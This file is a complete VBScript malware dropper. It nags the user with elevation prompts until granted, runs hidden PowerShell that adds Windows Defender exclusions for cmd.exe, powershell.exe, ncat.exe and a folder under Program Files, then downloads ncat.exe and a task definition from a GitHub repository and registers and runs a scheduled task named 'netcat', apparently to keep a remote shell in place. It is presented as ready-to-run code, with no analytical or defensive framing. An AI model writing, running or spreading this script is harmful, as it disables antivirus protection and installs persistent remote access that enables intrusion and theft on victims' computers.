Option Explicit

Dim sh, fs, temp, marker, target, cmd, tempPath
Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

temp   = sh.ExpandEnvironmentStrings("%TEMP%") & "\"
marker = temp & "windows-update.lock"

If Not WScript.Arguments.Named.Exists("elevated") Then
    If fs.FileExists(marker) Then WScript.Quit
    Do
        On Error Resume Next
        CreateObject("Shell.Application").ShellExecute _
            "wscript.exe", """" & WScript.ScriptFullName & """ /elevated:yes", "", "runas", 0
        On Error GoTo 0
        WScript.Sleep 1500
    Loop Until fs.FileExists(marker)
    WScript.Quit
End If

fs.CreateTextFile(marker, True).Write "ok"

tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
cmd = "powershell -nop -w hidden -c """ & _
      "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Microsoft\data';" & _
      "Add-MpPreference -ExclusionProcess 'ncat.exe';" & _
      "Add-MpPreference -ExclusionProcess 'cmd.exe';" & _
      "Add-MpPreference -ExclusionProcess 'powershell.exe'"""
sh.Run cmd, 0, True

target = "C:\Program Files (x86)\Microsoft\data"
If Not fs.FolderExists(target) Then
    On Error Resume Next
    fs.CreateFolder target
    If Err.Number <> 0 Then
        WScript.Echo "CreateFolder failed: " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
End If

Fetch "https://github.com/iNarrow12/VORTEX/releases/download/M5.1/ncat.exe", target & "\ncat.exe"
Fetch "https://raw.githubusercontent.com/iNarrow12/VORTEX/refs/heads/main/NCAT.xml", temp & "NCAT.xml"

sh.Run "schtasks /Create /TN netcat /XML """ & temp & "NCAT.xml"" /F", 0, True
sh.Run "schtasks /Run /TN netcat", 0, True

Sub Fetch(url, path)
    Dim xh, io
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.Open "GET", url, False
    xh.Send

    If xh.Status <> 200 Then
        WScript.Echo "Fetch failed: " & url & " (HTTP " & xh.Status & ")"
        Exit Sub
    End If

    Set io = CreateObject("ADODB.Stream")
    io.Type = 1
    io.Open
    io.Write xh.responseBody
    io.SaveToFile path, 2
    io.Close
End Sub
